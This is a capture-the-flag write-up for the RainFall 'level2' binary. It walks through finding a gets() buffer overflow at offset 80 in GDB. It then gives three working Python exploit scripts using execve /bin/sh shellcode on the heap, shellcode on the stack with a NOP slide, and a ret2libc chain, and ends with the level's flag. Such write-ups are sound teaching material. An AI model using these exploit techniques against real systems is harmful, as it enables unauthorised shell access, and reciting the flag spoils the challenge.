#### inside GDB:

###### by running :

```
> info fun
...
0x080484d4  p
0x0804853f  main
...
```
- we notice that there is two functions : __main()__ + __p()__

- __p()__ called inside the __main()__

###### by looking at the __p()__ assemby, we come out with this resume :

- flush the stdout with __fflush()__
- local variable __inpt__ with size 80 (we will explain how we found the 80)
- takes input from user by __gets()__ and store it into inpt
- ___gets()___ has a vulnerability since it doesnt check for size but only wait for endline \0
- takes the return address and apply the "__&&__" operation with _0xb0000000_ to prevent any overwrite with a system function address into the return adress
- check if the ret adress equal to _0xb0000000_
- if true :
        - __printf("(%p)\n", returnAdress)__ , print return adress
        - exit
- if false:
        - prints the input with __puts(input)__
        - call ___strdup(input)__


#### Find the exploit:
- lets find the offset of the buffer overflow 
using this tool :
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
we generate a string of 200 character, then we run the prog with this input inside gdb :
```
(gdb) run
Starting program: /home/user/level2/level2
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb)
```
the programm SEGFAULT with address __0x37634136__

- means that we filled all the buffer and wrote into return address so the pgramm procced to execute and found that the return address is 0x37.... which doesnt exist in the memory and even tho , we dont have access to
- lets take copy this address again into the tool above , and check for the offset
- result is 80
- means the buffer overflow at 80 characters

### there is 3 solutions:
___
##### 1:- use the shellcode exploit in the Hype
since the programm calls strdup which calls malloc 
that's mean a hype there baby :* 
which mean we can use the address of tha allocated hype section to execute our shell code after we fill the buffer of 80 
which mean we can write our adress after 80 character

```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7c4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                     = 0
gets(0xbffff6cc, 0, 0, 0xb7e5ec73, 0x80482b5allali
)          = 0xbffff6cc
puts("allali"allali
)                                         = 7
strdup("allali")                                       = 0x0804a008
+++ exited (status 8) +++
level2@RainFall:~$
```
strdup returns __0x0804a008__

hypeAdd = 0x0804a008
shell code + padding + hypeAddress = 84
....21.................59..................4...........= 84
- script that helps generate the exploit
```python
import struct
shell_code = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
#80 cd c9 31 e3 89 6e 69 62 2f 68 73 2f 2f 68 52 99 58 0b 6a
padding = "A" * 55
hypeAddress = struct.pack("I", 0x0804a008) # convert the hyper address to little indian format

pattern = shell_code + padding + hypeAddress
print(pattern)
```
___
##### 2:- use the shellcode exploit in the Stack
```python
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT" # length 80
shellcode =  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
fakeAddr = struct.pack("I", 0x0804853e) # to bypass the return address check
eip = struct.pack("I", 0xbffff700 + 40) # stack address but we move forward by 40 in order to fall into the nopslide
nopslide  = "\x90" * 100 # \x90 == nothing == nosplide : 
                         # when program get redirected to this aread of nops it will sldie to the shell code
payload = shellcode

print(padding + fakeAddr + eip + nopslide + payload)
```
___
##### 3:- use Ret2Libc exploit in the stack


```py
import struct

# buffer overflow offset is 80


# p()    return_adress = 0x0804853e
# main() return_adress = 0x0804854b

padding = "\x90" * 80
ret_adress = str(struct.pack("I", 0x0804853e)) #p() func ret addr
system = str(struct.pack("I", 0xb7e6b060))
returnAfterSystem = str(struct.pack("I", 0xb7e5ebe0)) # address of exit() function , system need it 
bin_sh = str(struct.pack("I", 0xb7f8cc58)) # /bin/sh

payload = padding + ret_adress + system + returnAfterSystem +  bin_sh
#          80     +     4      +    4   +         4         +   4 
print(payload)

```


#### flag : `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`